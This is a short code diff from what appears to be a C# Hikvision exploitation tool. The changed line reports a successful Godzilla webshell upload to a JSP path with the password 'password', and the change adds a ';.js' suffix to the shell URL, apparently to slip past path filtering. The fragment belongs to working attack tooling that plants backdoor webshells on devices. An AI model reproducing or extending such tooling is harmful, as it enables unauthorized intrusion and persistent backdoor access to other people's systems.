@@ -2650,7 +2650,7 @@ namespace hikvision漏洞利用工具
                 String res1 = doc.RootElement.GetProperty("data").GetProperty("link").GetString();
                 if (response.StatusCode == HttpStatusCode.OK)
                 {
-                    richTextBox3.AppendText("哥斯拉上传成功" + textBox1.Text + "/clusterMgr/g04a575542e19aa9b.jsp" + "密码:password" + "\r\n");
+                    richTextBox3.AppendText("哥斯拉上传成功" + textBox1.Text + "/clusterMgr/g04a575542e19aa9b.jsp" +";.js"+ "密码:password" + "\r\n");
                     richTextBox3.AppendText(res1 + "\r\n");
                 }
                 else
